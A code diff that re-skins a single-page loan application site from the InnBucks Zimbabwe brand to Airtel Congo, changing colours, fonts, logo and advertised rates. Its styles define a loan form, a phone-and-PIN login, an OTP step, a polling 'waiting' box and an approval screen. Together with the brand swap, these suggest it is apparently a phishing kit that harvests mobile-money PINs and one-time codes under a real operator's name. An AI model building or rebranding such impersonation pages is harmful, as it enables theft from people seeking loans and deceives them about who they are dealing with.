@@ -3,26 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>InnBucks Zimbabwe – Quick & Easy Loans</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<title>Airtel Congo – Quick & Easy Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Times+New+Roman&display=swap" rel="stylesheet">
 <style>
   :root {
-    --navy: #1C2340;
-    --navy-dark: #151929;
-    --teal: #1BC8D4;
-    --purple: #8B2FC9;
-    --grad: linear-gradient(to right, #1BC8D4, #8B2FC9);
-    --page-bg: #EBEBEB;
+    --airtel-red: #ED1C24;
+    --airtel-red-dark: #C41219;
+    --airtel-black: #1C2340;
+    --grad: linear-gradient(135deg, #ED1C24 0%, #FF4D4D 100%);
+    --page-bg: #F4F5F7;
     --white: #FFFFFF;
     --text-dark: #1C2340;
     --text-mid: #444;
     --text-light: #888;
-    --border: #ddd;
+    --border: #E5E7EB;
     --radius: 12px;
     --radius-sm: 8px;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
+  body { font-family: "Times New Roman", Times, serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
   /* PAGE SYSTEM */
   .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
@@ -34,38 +33,39 @@
   .overlay.show { display:flex; }
   .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
   @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
+  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
   @keyframes spin { to{transform:rotate(360deg)} }
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
-  /* LOGO */
-  .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
-  .logo-dots { display:grid; grid-template-columns:1fr 1fr; gap:3px; width:28px; height:28px; }
-  .logo-dots span { width:12px; height:12px; border-radius:50%; display:block; }
-  .dot-1{background:#F5A623;} .dot-2{background:#1BC8D4;} .dot-3{background:#2ECC71;} .dot-4{background:#9B59B6;}
-  .logo-text { font-size:1.1rem; font-weight:700; color:var(--teal); }
-  .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
+  /* PROFESSIONAL HEADER BRANDING & LOGO */
+  .brand-header { display: flex; align-items: center; justify-content: space-between; padding: 16px 28px; background: var(--white); border-bottom: 1px solid var(--border); width: 100%; }
+  .brand-logo-area { display: flex; align-items: center; gap: 12px; }
+  .brand-logo-mark { width: 40px; height: 40px; background: var(--grad); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--white); font-size: 1.3rem; font-weight: bold; box-shadow: 0 3px 10px rgba(237,28,36,0.25); }
+  .brand-text-group { display: flex; flex-direction: column; }
+  .brand-title { font-size: 1.15rem; font-weight: bold; color: var(--airtel-red); letter-spacing: -0.01em; line-height: 1.2; }
+  .brand-subtitle { font-size: 0.75rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.05em; }
+  .brand-nav-right { font-size: 0.85rem; color: var(--text-mid); font-weight: 600; cursor: pointer; }
 
   /* NAV */
-  .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
-  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
+  .navbar { background:var(--airtel-red); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
+  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
   .nav-left:hover { color:#fff; }
   .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
-  .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
+  .hline { width:20px; height:2px; background:rgba(255,255,255,0.8); border-radius:1px; }
 
   /* BUTTONS */
-  .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
-  .btn-grad:hover { opacity:0.9; }
-  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
-  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
+  .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:"Times New Roman", Times, serif; transition:opacity 0.2s, box-shadow 0.2s; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+  .btn-grad:hover { opacity:0.95; box-shadow:0 6px 16px rgba(237,28,36,0.35); }
+  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; box-shadow:none; }
+  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:"Times New Roman", Times, serif; transition:background 0.2s; }
   .btn-gray:hover { background:#d0d0d0; }
 
   /* FORM */
   .field { margin-bottom:18px; }
   .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
-  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
-  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(27,200,212,0.12); }
+  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:"Times New Roman", Times, serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
+  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
   .field textarea { resize:vertical; min-height:90px; }
   .sel-wrap { position:relative; }
   .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
@@ -78,8 +78,8 @@
   /* STEP PROGRESS */
   .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
   .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
-  .prog-seg.done { background:var(--purple); }
-  .prog-seg.now  { background:var(--teal); }
+  .prog-seg.done { background:var(--airtel-black); }
+  .prog-seg.now  { background:var(--airtel-red); }
 
   /* STEP BUTTONS */
   .step-btns { display:flex; gap:12px; margin-top:8px; }
@@ -90,38 +90,35 @@
 
   /* ───── PAGE 1: LANDING ───── */
   #page-landing { background:var(--page-bg); }
-  .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:52px; flex-shrink:0; }
-  .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .land-nav .hbg span { width:20px; height:2px; background:rgba(255,255,255,0.7); border-radius:1px; display:block; }
   .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
+  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:36px 32px; border-top:4px solid var(--airtel-red); }
   .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
   .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
   .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
   .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
   .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
-  .calc-row2 .cv { color:var(--teal); font-weight:600; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--teal) 0%,var(--teal) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--teal); border:3px solid #fff; box-shadow:0 2px 6px rgba(27,200,212,0.4); cursor:pointer; }
+  .calc-row2 .cv { color:var(--airtel-red); font-weight:600; }
+  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--airtel-red) 0%,var(--airtel-red) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
+  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--airtel-red); border:3px solid #fff; box-shadow:0 2px 6px rgba(237,28,36,0.4); cursor:pointer; }
   .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
   .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
   .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
-  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--teal); }
+  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--airtel-red); }
   .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
   .feat { text-align:center; }
   .feat .fi { font-size:1.6rem; margin-bottom:5px; }
   .feat .ft { font-size:0.8rem; font-weight:600; }
   .feat .fs { font-size:0.73rem; color:var(--text-light); }
-  .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.45); flex-shrink:0; }
+  .land-footer { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
 
   /* ───── STEP PAGES 2-4 ───── */
   .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
-  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
+  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:32px 28px; border-top:4px solid var(--airtel-red); }
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
   .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
 
   /* SUMMARY */
-  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fafffe; }
+  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--airtel-red); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fff5f5; }
   .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
   .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
   .sum-row:last-child { border-bottom:none; }
@@ -129,73 +126,67 @@
   .sum-row .sv { font-weight:500; }
 
   /* ───── PAGE 5: SUBMITTED ───── */
-  #page-submitted { background:linear-gradient(160deg,var(--navy),#2a2f5a); align-items:center; justify-content:center; }
+  #page-submitted { background:var(--airtel-red); align-items:center; justify-content:center; }
   .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
-  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
-  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(27,200,212,0.3)} 50%{box-shadow:0 0 0 16px rgba(27,200,212,0)} }
+  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.15); border:2px solid rgba(255,255,255,0.4); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; color:#fff; }
+  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,0.4)} 50%{box-shadow:0 0 0 16px rgba(255,255,255,0)} }
   .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
-  .sub-wrap p  { color:rgba(255,255,255,0.75); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
-  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
-  .redir-n { font-weight:700; color:var(--teal); }
-  .btn-go { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; letter-spacing:0.04em; }
+  .sub-wrap p  { color:rgba(255,255,255,0.85); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
+  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.3); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
+  .redir-n { font-weight:700; color:#fff; background:rgba(0,0,0,0.2); padding:2px 8px; border-radius:10px; }
+  .btn-go { background:#fff; color:var(--airtel-red); border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:"Times New Roman", Times, serif; letter-spacing:0.04em; transition:background 0.2s; }
+  .btn-go:hover { background:#f8f9fa; }
 
   /* ───── PAGE 6: LOGIN ───── */
   #page-login { background:#fff; }
-  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
   .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
   .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
   .login-inner { width:100%; max-width:380px; }
   .lg-phone-row { display:flex; margin-bottom:24px; }
   .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:'Inter',sans-serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--teal); }
+  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:"Times New Roman", Times, serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
+  .lg-phone-row input:focus { border-color:var(--airtel-red); }
   .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
   .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(27,200,212,0.12); }
+  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.3rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
+  .pin-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
   .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#fff; }
+  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .btn-login.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
-  .lg-terms a { color:rgba(255,255,255,0.65); }
+  .lg-curve::before { content:''; display:block; background:var(--airtel-black); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
+  .lg-foot { background:var(--airtel-black); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; color:#fff; }
+  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.5); margin-top:4px; }
+  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.6); }
+  .lg-terms a { color:#fff; text-decoration:underline; }
 
   /* ───── PAGE 7: OTP ───── */
   #page-otp { background:#fff; }
-  .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
-  .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
-  .otp-topbar .hbg2 { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .otp-topbar .hbg2 span { width:20px; height:2px; background:#666; border-radius:1px; display:block; }
   .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
-  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); }
+  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); border-top:4px solid var(--airtel-red); }
   .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
   .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
   .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
   .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
-  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(27,200,212,0.12); }
-  .otp-resend { font-size:0.8rem; color:var(--teal); margin-bottom:22px; }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-otp.rdy { background:var(--grad); color:#fff; }
+  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.2rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
+  .otp-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
+  .otp-resend { font-size:0.8rem; color:var(--airtel-red); margin-bottom:22px; }
+  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .btn-otp.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
   .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
-  .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
+  .otp-curve::before { content:''; display:block; background:var(--airtel-black); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
+  .otp-foot { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.6); }
 
   /* ───── PAGE 8: APPROVAL ───── */
-  #page-approval { background:linear-gradient(135deg,#1BC8D4 0%,#8B6FD4 50%,#9B59B6 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
+  #page-approval { background:linear-gradient(135deg,#ED1C24 0%,#C41219 50%,#1C2340 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
   .appr-wrap { width:100%; max-width:520px; }
   .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
-  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(27,200,212,0.4); }
+  .check-circle { width:56px; height:56px; border-radius:50%; background:var(--grad); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(237,28,36,0.4); }
   .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
   .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
   .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
-  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.8); text-transform:uppercase; letter-spacing:0.06em; }
+  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.9); text-transform:uppercase; letter-spacing:0.06em; }
   .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
   .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
   .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
@@ -206,19 +197,19 @@
   .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
   .ld-row:last-child { border-bottom:none; }
   .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
-  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
-  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9);}
-  .ic-p{background:linear-gradient(135deg,#9B59B6,#8E44AD);}
+  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60); color:#fff;}
+  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9); color:#fff;}
+  .ic-p{background:linear-gradient(135deg,#ED1C24,#C41219); color:#fff;}
   .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
   .ld-val { font-size:0.9rem; font-weight:600; }
   .qa-wrap { background:#fff; padding:0 24px 18px; }
   .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--teal); color:var(--teal); }
+  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
+  .qa-btn:hover { border-color:var(--airtel-red); color:var(--airtel-red); }
   .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
   .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
   .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
-  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; }
+  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:"Times New Roman", Times, serif; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
 
   /* ───── INLINE ERROR / STATUS MESSAGES ───── */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
@@ -232,7 +223,7 @@
   /* ───── WAITING / POLLING INDICATOR ───── */
   .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
   .waiting-box.show { display:block; }
-  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
+  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
   .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
 
   @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
@@ -242,14 +233,17 @@
 
 <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
 <div id="page-landing" class="page active">
-  <nav class="land-nav">
-    <div class="hbg"><span></span><span></span><span></span></div>
-    <div class="logo-group">
-      <div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div>
-      <div class="logo-text">InnBucks</div>
+  <!-- Professional Top Brand Header with Logo -->
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Financial Services</span>
+      </div>
     </div>
-    <div style="width:28px"></div>
-  </nav>
+    <div class="brand-nav-right" onclick="goTo('page-login')">Sign In</div>
+  </header>
 
   <div class="land-center">
     <div class="land-card">
@@ -259,14 +253,14 @@
       <div class="calc-box">
         <h2>Loan Calculator</h2>
         <div class="calc-row2"><span>Loan Amount</span><span class="cv" id="aDisp">$1,000</span></div>
-        <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.9%">
+        <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.5%">
         <div class="range-ends"><span>$50</span><span>$10,000</span></div>
         <div class="calc-row2"><span>Loan Term</span><span class="cv" id="tDisp">12 months</span></div>
         <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
         <div class="range-ends"><span>6 months</span><span>60 months</span></div>
         <div class="monthly-box">
           <span class="ml">Monthly Payment</span>
-          <span class="ma" id="mOut">$104.17</span>
+          <span class="ma" id="mOut">$88.85</span>
         </div>
       </div>
 
@@ -274,22 +268,28 @@
 
       <div class="feats-row">
         <div class="feat"><div class="fi">⚡</div><div class="ft">Fast Approval</div><div class="fs">Within 24 hours</div></div>
-        <div class="feat"><div class="fi">💰</div><div class="ft">Low Rates</div><div class="fs">From 25%</div></div>
+        <div class="feat"><div class="fi">💰</div><div class="ft">Low Rates</div><div class="fs">From 12%</div></div>
         <div class="feat"><div class="fi">🔒</div><div class="ft">Secure</div><div class="fs">Bank-level</div></div>
       </div>
     </div>
   </div>
 
